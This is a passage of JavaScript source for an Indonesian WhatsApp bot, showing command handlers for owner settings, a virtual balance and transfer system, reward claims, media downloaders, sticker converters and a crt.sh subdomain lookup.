    if (!text) return reply(`type yang tersedia:\n\n- 1\n- 2\n- 3\n- 4\n\n`)
    if (text == '1' || text == '2' || text == '3' || text == '4') {
        global.typeReply = `${text}`
        reply(`sukses mengubah type reply ke: ${text}`)
    } else reply(`type yang tersedia:\n\n- 1\n- 2\n- 3\n- 4\n\n`)
    }
    break

case 'self': {
if (!isCreator) return reply(mess.owner) 
ptz.public = false
reply('_Sukses Change To Self_')
}
break

case 'del': case 'd': {
    if (!isAdmins) return reply(mess.admin)
    if (!m.quoted) return false
    let {
        chat,
        fromMe,
        id,
        isBaileys
    } = m.quoted
    ptz.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    })
    }
    break

case 'cls': {
if (!isCreator) return reply(mess.owner)
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) return reply('Failed to download sticker!')
stiker = await addExifAvatar(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else return reply('Conversion failed')
}
}
break        
case 'public': {
if (!isCreator) return reply(mess.owner) 
ptz.public = true
reply('_Sukse Change To Public_')
}
break

case 'setppbot':
case 'setpp': {
if (!isCreator) return reply(mess.owner)
if (/image/g.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
await ptz.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply(mess.done)
} else return ('dengan mengirim foto')
}
break

case 'setbotname':{
if (!isCreator) return reply(`Khusus GhostXdzz`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} ${botname}`)
await ptz.updateProfileName(text)
reply(`Berhasil Mengubah Nama Bot Tuan✅`)
}
break

case 'backupdb': case 'backupdatabase': {
if (!isCreator) return reply(mess.owner)
 ptz.sendMessage(m.chat, {document: await fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'application/json'}, {quoted: m})
}
break

case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
/*let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
reply(teks)
await sleep(2000)*/
 reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
 reply("Berhasil menghapus semua sampah di folder session")
});
}
break        

case 'backup':{
if (!isCreator) return reply(mess.owner);
  const { execSync } = require("child_process");
  const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "session" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await ptz.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "GhostScript.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
//BATAS OWNER MENU

//MAIN MENU

case 'saldo': case 'balance': {
    dos = `*Y O U R - B A L A N C E*

*Name:* ${pushname}
*Nomer:* @${m.sender.split('@')[0]}
*Saving:* ${formatIDR(users.saving)}
*Balance:* ${formatIDR(users.balance)}

*Note :*
Saldo hanya bisa untuk beli di bot
Tidak bisa ditarik atau transfer!\n`
    ptz.sendMessage(m.chat, {
        text: dos,
        contextInfo: {
            mentionedJid: await Func.ments(dos),
            externalAdReply: {
                showAdAttribution: false,
                title: `© 2024 | B A L A N C E  I N F O`,
                body: '',
                thumbnailUrl: "https://telegra.ph/file/7dc8fc31fa17f368ee802.png",
                sourceUrl: hariini,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
    }
    break

case 'report': {
if (!text) return m.reply(`mau report erorr apa ke developer?\n\nanda juga bisa mengirim bukti erorr`)

if (/image/.test(mime)) {
if (!quoted) return reply(`reply image`)
if (!text) return reply(`mau report eror apa ke developer?`)

let img = await quoted.download()
let media = await uploadImage(img)
m.reply(`terimakasih atas masukan nya, report an anda akan di sampaikan ke developer`)

ptz.sendImage(owner + "@s.whatsapp.net", media, `*[ system notice ]* ada yang report eror nih, dari @${m.sender.split("@")[0]}\nPesan : *${text}*\n`, m)
} else {
m.reply(`terimakasih atas masukan nya, report an anda akan di sampaikan ke developer`)
ptz.reply(owner + "@s.whatsapp.net", `*[ system notice ]* ada yang report eror nih, dari @${m.sender.split("@")[0]}\nPesan : *${text}*\n`, m)
}
}
break

case 'saving': {
    if (!args || !args[0]) return ptz.reply(m.chat, `*Example* : ${prefix + command} 10000`, m)
    if (users.balance == 0) return ptz.reply(m.chat, Func.texted('bold', `🚩 You have no points.`), m)
    if (isNaN(args[0])) return ptz.reply(m.chat, Func.texted('bold', `🚩 The nominal point must be a number.`), m)
    if (args[0] < 10000) return ptz.reply(m.chat, Func.texted('bold', `🚩 Minimum 10K point to save.`), m)
    if (args[0] > users.balance) return ptz.reply(m.chat, Func.texted('bold', `🚩 The point you have is not enough to save.`), m)
    users.balance -= parseInt(args[0])
    users.saving += parseInt(args[0])
    users.saving_history.push({
        sn: Func.makeId(5),
        nominal: parseInt(args[0]),
        type: 'SAVING',
        date: new Date * 1
    })
    let teks = `乂  *S A V I N G*\n\n`
    teks += `Successfully saved points into savings with the amount ${Func.formatNumber(args[0])}\n\n`
    teks += `➠ *Total* : ${Func.formatNumber(users.balance)}\n`
    teks += `➠ *SN* : ${Func.makeId(5)}`
    ptz.reply(m.chat, teks, m)
    }
    break

case 'transfer': {
    if (m.quoted) {
        function no(number) {
            return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        if (m.quoted.isBot) return reply(Func.texted('bold', `🚩 Cannot make transfers to bot.`))
        if (!args || !args[0]) return reply(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
        if (isNaN(args[0])) return reply(Func.texted('bold', `🚩 The balance must be a number.`))
        
        let nominal = parseInt(args[0]);
        let ppn = parseInt(((25 / 100) * nominal).toFixed(0));
        let point = users.balance;
        let user = global.db.data.users;
        let target = ptz.decodeJid(m.quoted.sender);
        
        // Ensure target user exists in the database
        if (!user[target]) return reply(Func.texted('bold', `🚩 Target user not found in the database.`));
        
        if (nominal > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
        if ((nominal + ppn) > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
        if (nominal < 5000) return reply(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
        
        users.balance -= (nominal + ppn);
        user[target].balance += nominal;
        
        let teks = `乂  *T R A N S F E R*\n\n`
        teks += `“Transfer successfully to *@${target.replace(/@.+/g, '')}*”\n\n`
        teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
        teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
        teks += `➠ *Remaining Balance* : ${Func.formatNumber(users.balance)}`
        
        reply(teks);
    } else if (text) {
        function no(number) {
            return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        if (!args || !args[1]) return reply(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
        if (isNaN(args[1])) return reply(Func.texted('bold', `🚩 The balance must be a number.`))
        
        let nominal = parseInt(args[1]);
        let ppn = parseInt(((25 / 100) * nominal).toFixed(0));
        let point = users.balance;
        let user = global.db.data.users;
        
        let hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        
        // Ensure target user exists in the database
        if (!user[hl[0]]) return reply(Func.texted('bold', `🚩 Target user not found in the database.`));
        
        if (nominal > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
        if ((nominal + ppn) > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
        if (nominal < 5000) return reply(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
        
        users.balance -= (nominal + ppn);
        user[hl[0]].balance += nominal;
        
        let teks = `乂  *T R A N S F E R*\n\n`
        teks += `“Transfer successfully to *@${hl[0].split("@")[0]}*”\n\n`
        teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
        teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
        teks += `➠ *Remaining Balance* : ${Func.formatNumber(users.balance)}`
        
        reply(teks);
    } else {
        let teks = `• *Example* :\n\n`
        teks += `${prefix + command} @⁨WhatsApp⁩ 10000\n`
        teks += `${prefix + command} 10000 (reply chat target)`
        reply(teks);
    }
}
break;


case'ping':
case'info':{ 
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const muptime = runtime(process.uptime()).trim()
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

const serverInfo = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Runtime: ${muptime}
- Type: case 
`.trim();

ptz.reply(m.chat, serverInfo, m);
}
break

case 'me': case 'profile': {
    let user = global.db.data.users[who];
    let {
        min,
        xp,
        max
    } = await levelling.xpRange(user.level, global.multiplier);
    let math = max - xp;
    if (typeof user == "undefined")
      return m.reply("Pengguna Tidak Berada di Dalam Database");
    let caption = `乂 *U S E R - P R O F I L E*\n\n`
    caption += `${mtA}*Name* : ${user.name ? user.name : ptz.getName(who)}\n`
    caption += `${mt}*Age* : ${user.age}\n`
    caption += `${mt}*Balance* : Rp ${Func.formatter(user.balance)}\n`
    caption += `${mt}*Saving* : Rp ${Func.formatter(user.saving)}\n`
    caption += `${mt}*Limit* : ${Func.formatter(user.limit)}\n`
    caption += `${mt}*Exp* : ${Func.h2k(user.exp)}\n`
    caption += `${mt}*Hitstat* : ${user.hit}\n`
    caption += `${mtB}*Loved* : ${user.pasangan ? `@${user.pasangan.split("@")[0]}` : 'gada yahaha'}\n\n`
    caption += `乂 *U S E R -  S T A T U S*\n\n`
    caption += `${mtA}*Verified* : ${user.registered ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Premium* : ${user.premium ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Banned* : ${user.banned ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Level* : ${user.level}\n`
    caption += `${mt}*Role* : ${user.role}\n`
    caption += `${mt}*Exp Min* : (${user.exp - min} / ${xp})\n`
    caption += `${mtB}*Expired* : ${user.expired == 0 ? '-' : msToDate(user.expired - new Date() * 1)}\n\n`
    caption += global.footer
    ptz.sendFile(m.chat, ppuser, '', caption, m)
    }
    break

case 'totalfitur': {
reply(`${totalFitur()} Features`)
}
break

case 'bulanan': {
    const limitfree = Func.randomInt(20, 40)
    const limitprem = Func.randomInt(30, 50)
    const moneyfree = Func.randomInt(20000, 50000)
    const moneyprem = Func.randomInt(50000, 100000)
    let user = global.db.data.users[m.sender]

    let time = global.db.data.users[m.sender].lastmonthly + 2592000000
    if (new Date - global.db.data.users[m.sender].lastmonthly < 2592000000) return m.reply(`You've claimed, this monthly claim.\nwait for ${Func.toDate(time - new Date())} again`)
    global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
    global.db.data.users[m.sender].limit += isPremium ? limitprem : limitfree
    ptz.sendText(m.chat, `Congratulations you got it :\n\n+ ${isPremium ? moneyprem : moneyfree} Money\n+ ${isPremium ? limitprem : limitfree} Limit`, m)
    global.db.data.users[m.sender].lastmonthly = new Date * 1
    }
    break

case 'redeem': {
    if (!m.isGroup) return m.reply(mess.group);
    
    let user = global.db.data.users[m.sender];
    let currentTime = new Date().getTime();

    if (!text) {
        return m.reply(Func.example(prefix, command, `GhostXdzz`));
    }
    
    let redeem = db.data.respon;
    
    // Check if the user has already claimed the current code
    if (user.lastRedeemedCode === redeem) {
        m.reply('Kamu sudah mengklaim kode ini dan tidak bisa mengklaim lagi.');
        return;
    }
    
    // Check if the redeem code has already reached its limit
    if (!global.db.data.redeemCounts) {
        global.db.data.redeemCounts = {};
    }
    
    if (!global.db.data.redeemCounts[redeem]) {
        global.db.data.redeemCounts[redeem] = 0;
    }

    // Ensure global.db.jumlah exists and m.chat is initialized
    if (!global.db.jumlah) {
        global.db.jumlah = {};
    }
    
    if (!global.db.jumlah[m.chat]) {
        global.db.jumlah[m.chat] = 0;
    }

    if (global.db.data.redeemCounts[redeem] >= global.db.jumlah[m.chat]) {
        await m.reply('Kode redeem ini telah mencapai batas maksimum pengklaiman.');
        return;
    }
    
    if (text.toLowerCase() === redeem.toLowerCase()) {
        let limits = randomInt(10, 25);
        let exps = randomInt(20000, 50000);
        let balances = randomInt(20000, 70000);
        user.lastredeem = currentTime;
        user.lastRedeemedCode = redeem; // Store the last redeemed code
        
        m.reply(`*REDEEM BERHASIL*
        
*[ HADIAH ]*
1. Limit: ${limits}
2. Money: ${formatIDR(balances)}
`);
        
        user.limit += limits;
        user.balance += balances;
        
        // Increment the redeem count
        global.db.data.redeemCounts[redeem]++;
    } else {
        m.reply('*[ INVALID REDEEM CODE ]*');
    }
};
break;

case 'claim': {
let timeClaim = 3600000
let claimed = new Date(users.lastclaim + timeClaim)
let timeout = claimed - new Date()
let balance = Func.randomInt(1, 5000)
let limits = Func.randomInt(5, 20)
if (new Date - users.lastclaim >= timeClaim) {
reply(`🎉 Congratulations!, you got +${Func.formatNumber(balance)} balance and +${Func.formatNumber(limits)} limit.`)
users.balance += balance
users.limit += limits
users.lastclaim = new Date() * 1
} else {
reply(`*You have claimed, you can reclaim in the next hour.*\n\n*Timeout : [ ${Func.toTime(timeout)} ]*`)
}
}
break

case 'owner': {
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;ciaa xyzz\nORG:${ownername}\nTITLE:soft\nitem1.TEL;waid=${owner}:${owner}\nitem1.X-ABLabel:Ponsel\nitem2.URL:http://github.com/kayyIo\nitem2.X-ABLabel:ðŸ’¬ More\nitem3.EMAIL;type=INTERNET:${email}\nitem3.X-ABLabel:Email\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABADR:ðŸ’¬ More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;
      const sentMsg = await ptz.sendMessage(
    m.chat,
    {
      contacts: {
        displayName: ownername,
        contacts: [{ vcard }],
      },
      contextInfo: {
        externalAdReply: {
          title: "M Y  O W N E R",
          body: "",
          thumbnailUrl: thumbnail,
          mediaType: 1,
          showAdAttribution: false,
          renderLargerThumbnail: true,
        },
      },
    },
    { quoted: m },
  );
    }
    break

case'tqto':{
let tekk = `Hai ${kyuu}@${m?.sender.split('@')[0]}${kyuu} Here are some people who have helped in the development of this script

* GhostXdzz (Development)
* RaditzOffc (Suport & Panel & My friend)
* KyuuRzy (Support & My Frend)
* DiiOffc (Support & My Frend)
* KayyOffc (Support & My Frend)

To them, I say thank you very much, without them the script would be nothing\n`
ptz.sendMessage(m.chat, {
text: tekk,
contextInfo: {
mentionedJid: [m.sender],
isForwarded: true,
externalAdReply: {
title: `© Thanks To - Participate`,
body: `Thanks For`,
thumbnailUrl: "https://telegra.ph/file/889d17c606f2a4be8481e.jpg",
sourceUrl: `https://kyuurzy.site`,
mediaType: 1,
showAdtibution: true,
renderLargerThumbnail: true
}}}, {quoted:m})}
break
//BATAS MAIN MENU
//DOWNLOAD MENU
case 'tiktok': case 'tt': {
if (!text) return reply(`Enter the TikTok link`)
//if (!text.match(/(https:\/\/tiktok.com\/)/gi)) return reply(`invalid link`)
let tt = await fetchJson(`https://api.kyuurzy.site/api/download/tiktok?query=${text}`)
let res = tt.result
let cap = `[ *T I K T O K - D O W N L O A D E R* ]\n\n`
cap += `* Title: ${res.title}\n\n`
ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap }, { quoted: m })
ptz.sendMessage(m.chat, { audio: { url: res.music }, })
}
break

case 'audio': {
if (limitnya < 1) return m.reply(mess.limit)
if (!m.quoted) return reply('Reply Pesan');

    // Regex untuk mendeteksi berbagai format URL YouTube
    let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);

    if (!urls) 
        return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');

   // reply(mess.wait);

    // Memastikan text adalah indeks yang valid untuk urls
    let urlIndex = parseInt(text) - 1;
    if (urlIndex < 0 || urlIndex >= urls.length) 
        return reply('Indeks URL tidak valid');

    // Panggil fungsi downloadMp3 dengan URL yang terpilih
    await downloadMp3(urls);
uselimit()}
break;
        
case 'video': {
if (limitnya < 1) return m.reply(mess.limit)
    if (!m.quoted) 
        return reply('Reply Pesan');

    // Regex untuk mendeteksi berbagai format URL YouTube
    let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);

    if (!urls) 
        return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');

   // reply(mess.wait);

    // Memastikan text adalah indeks yang valid untuk urls
    let urlIndex = parseInt(text) - 1;
    if (urlIndex < 0 || urlIndex >= urls.length) 
        return reply('Indeks URL tidak valid');

    // Panggil fungsi downloadMp3 dengan URL yang terpilih
    await downloadMp4(urls);
uselimit()}
break;

case 'play2':{
    if (!text) return reply(`*• Contoh :* ${prefix + command} *[judul lagu]*`);
    m.reply("Sedang mencari...");
    let search = await ytdl.search(text);
    let result = search.data[0];
    ptz.sendMessage(
      m.chat,
      {
        audio: {
          url: await (await ytdl.mp3(result.url)).media,
        },
        mimetype: "audio/mp4",
        contextInfo: {
          externalAdReply: {
            title: result.title,
            body: result.author.name,
            mediaType: 1,
            thumbnailUrl: result.img,
            renderLangerThumbnail: true,
          },
        },
      },
      {
        quoted: m,
      },
    );
  }
break



case 'play': {
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return reply(`*Example*: ${prefix + command} drunk text`)
  // Cari musik menggunakan yts
const randomReduction = Math.floor(Math.random() * 5) + 1;
let search = await yts(text);
let telaso = search.all[0].url;
let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please reply ${prefix}*audio/video* to download`;

  // Kirim pesan dengan thumbnail
 ptz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: body }, { quoted: m });

  // Simpan URL untuk diambil nanti oleh getaudio
global.db.data.users[m.sender].lastSearchUrl = telaso; 
uselimit()}
break;

case'mediafire':{
if (limitnya < 1) return m.reply(mess.limit)
let input = `*Example*: ${prefix + command} https://www.mediafire.com/file/pwxob70rpgma9lz/GBWhatsApp_v8.75%2528Tutorial_Yud%2529.apk/file*`
	if (!text) return reply(input)
	const baby1 = await mediafire(text)
	if (baby1.filesize.split('MB')[0] >= 100) return reply('*File Over Limit* ' + util.format(baby1))
				await sleep(500)
				const result = `*MEDIAFIRE DOWNLOADER*

📄 *Name* : ${baby1.filename}
⚖️ *Size* : ${baby1.filesize}
📨 zType* : ${baby1.filetype}
🔗 *Link* : ${baby1.link}
📋 *UploadAt*: ${baby1.uploadAt}
`
ptz.sendFile(m.chat, baby1.link || result, `${baby1.filename}`, '', m, null, { mimetype: `${baby1.filetype}`, asDocument: true })
uselimit()}
break

case'spotifydl': case 'sp': case 'spt': {
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `[*S P O T I F Y*]

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
ptz.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘',
"body": `https://kyuurzy.my.id`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/705e201f1ca881cd711e2.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: m})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
ptz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',ptt:true,
contextInfo: {
externalAdReply: {
title: `𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/705e201f1ca881cd711e2.jpg', 
sourceUrl: 'https://kyuurzy.my.id',
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break

case 'ytmp4': {
if (limitnya < 1) return m.reply(mess.limit)
if (m.isGroup) {
reply(`Bot Telah Mengirimkan Video Di Private Chat !!!`)}
if (!text) return reply(`*Example*: ${prefix + command} https://www.youtube.com/xxxxxxx`)
/*ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let searchResponse = await ytdlnew(text)
ptz.sendMessage(sender, { video: {url: searchResponse.mp4DownloadLink}, caption: '' },
{ quoted:m})*/
downloadMp4(text)
uselimit()}
break
    
    case 'ytmp3': {
    if (limitnya < 1) return m.reply(mess.limit)
if (!text) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)
/*ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let searchResponse = await ytdlnew(text)
ptz.sendMessage(m.chat, { audio: {url: searchResponse.mp3DownloadLink}, mimetype: "audio/mp4", ptt: true},{quoted:m})*/
downloadMp3(text)
uselimit()}
break
//BATAS DOWNLOAD MENU

//CONVERT MENU

case'stext':{
if (!text) return reply(`*Example:* ${prefix + command} Tes`)
ptz.sendReact(m.chat, "🕛", m.key )
let uploadImage = require ("./lib/uploadImage")
let json = {
type: 'stories',
format: 'png',
backgroundColor: '#1b1e23',
width: 512,
height: 720,
scale: 4,
watermark: 'ghostxdzz.me',
messages: [{
entities: 'auto',
avatar: true,
from: {
id: 18,
name: await ptz.getName(m.sender),
photo: {
url: await ptz.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")}},
text: text }, 
]};
const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
var media = Buffer.from(data.image, 'base64')
var res = await uploadImage(media)
ptz.sendReact(m.chat, "✅", m.key )
ptz.sendMessage(m.chat, { image: { url:res }, caption: ''},{quoted: m })
}
break

case 'upvidey': case 'uploadvidey': {
    if (!/video/.test(mime)) return m.reply(`*Send/Reply the Video With Caption* ${prefix + command}`)
    if (!quoted) return m.reply(`*Send/Reply the Video Caption* ${prefix + command}`)
    let media = await quoted.download()
    let result = await Scraper.Uploader.uploadVidey(media)
    ptz.reply(m.chat, result, m)
    }
    break

case 'tomp4': case 'tovideo': case 'tovid': {
    if (!m.quoted) return m.reply(`Reply sticker with caption *${prefix + command}*`)
    if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption *${prefix + command}*`)
    const {
        webp2mp4
    } = require('./lib/webp2mp4.js')
    let media = await m.quoted.download()
    let out = Buffer.alloc(0)
    if (/webp/.test(mime)) {
        out = await webp2mp4(media)
    }
    // await ptz.sendFile(m.chat, out, 'out.gif', wm, m, 0, { mimetype: 'video/gif', thumbnail: Buffer.alloc(0) })
    ptz.sendMessage(from, {
        video: {
            url: out,
            caption: 'Convert Webp To Video'
        },
        gifPlayback: false
    }, {
        quoted: m
    })
    }
    break

case 'sticker': case 's': case 'stickergif': case 'sgif': {
    if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
    if (/image/.test(mime)) {
        let media = await quoted.download()
        let encmedia = await ptz.sendImageAsSticker(from, media, fverif, {
            packname: global.packname,
            author: global.author
        })
        await fs.unlinkSync(encmedia)
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
        let media = await quoted.download()
        let encmedia = await ptz.sendVideoAsSticker(from, media, fverif, {
            packname: global.packname,
            author: global.author
        })
        await fs.unlinkSync(encmedia)
    } else {
        m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
    }
    }
    break

case 'smeme': {
    let [atas, bawah] = text.split`|`
    if (!mime) return m.reply(`Reply image, • *Example :* Top Text|Bottom Text`)
    if (!isMedia) return m.reply(`Mime ${mime} tidak didukung!`)
    let img = await quoted.download()
    let url = await Scraper.Uploader.ucarecdn(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    ptz.sendImageAsSticker(m.chat, meme, m, { packname: packname, author: author })
    }
    break

case 'qc': {
		let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text;
		if (!teks) return reply(`Example: ${prefix + command} <Reply/Input Text>`);
		const res = await Scraper.Convert.quote(teks, ppuser, pushname)
		ptz.sendImageAsSticker(m.chat, res, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    })
    }
    break
    
case 'tovn': {
if (limitnya < 1) return m.reply(mess.limit)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`)
if (!quoted) return reply(`reply video/vn dengan caption ${prefix + command}`)
reply(mess.bugrespon)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ptz.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
uselimit()
}
break
    
 case 'toimg': {
 if (!quoted) reply ('m?.reply Image')
if (!/webp/.test(mime)) reply (`Balas sticker dengan caption *${prefix + command}*`)
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) reply (err)
let buffer = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case'searchsubdo':{
if (!text) return ptz.reply(m.chat, 'Harap masukkan domain utama yang ingin dicari subdomainnya.', m);

const domain = text.trim().replace(/^https?:\/\//, '');
async function searchSubdomains(domain) {
    const url = `https://crt.sh/?q=${domain}&output=json`;
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        const subdomains = data.map(entry => entry.name_value);
        const uniqueSubdomains = [...new Set(subdomains)];
        uniqueSubdomains.sort();
        
        return uniqueSubdomains;
    } catch (error) {
        console.error('Error fetching subdomains:', error);
        return null;
    }
}
const subdomains = await searchSubdomains(domain);

if (subdomains) {
const message = subdomains.join('\n* ');
const total = subdomains.length;
ptz.reply(m.chat, `Ditemukan ${total} subdomain untuk ${domain}:\n\n${message}`, m);
} else {
ptz.reply(m.chat, 'Tidak ada hasil yang ditemukan atau terjadi kesalahan.', m);
}
};
break       

case'tourl':{
let text = m.quoted ? m.quoted : m
ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }});
let media = await text.download()
let uploadImage = require('./lib/uploadImage')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
const baten = new Button()
let ads = baten.setBody(`${isTele ? '(Tidak ada tanggal kadaluwarsa)' : '(Tidak diketahui)'}\n ${media.length} Byte(s)`)
ads += baten.addCopy("Copy Url Media", `${link}`);
ads += baten.run(m.chat, ptz, m);
}
break

case 'hd': {
    if (!quoted) return reply("reply image nya")
    if (!/image/.test(mime)) return reply(`khusus image bang`)
    let media = await quoted.download()
    let anu = await uploadImage(media)
    let rsult = await fetchJson(`https://www.api.vyturex.com/upscale?imageUrl=${anu}`)
    ptz.sendMessage(m.chat, {
        image: {
            url: rsult.resultUrl
        },
        caption: 'done'
    }, {
        quoted: m
    })
    }
    break

case 'remini':{
if (limitnya < 1) return m.reply(mess.limit)
ptz.enhancer = ptz.enhancer ? ptz.enhancer : {};
if (m.sender in ptz.enhancer)
return ptz.reply(m.chat, "Masih Ada Proses Yang Belum Selesai Kak, Silahkan Tunggu Sampai Selesai Yah >//<", m)
let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || q.mediaType || "";
if (!mime)
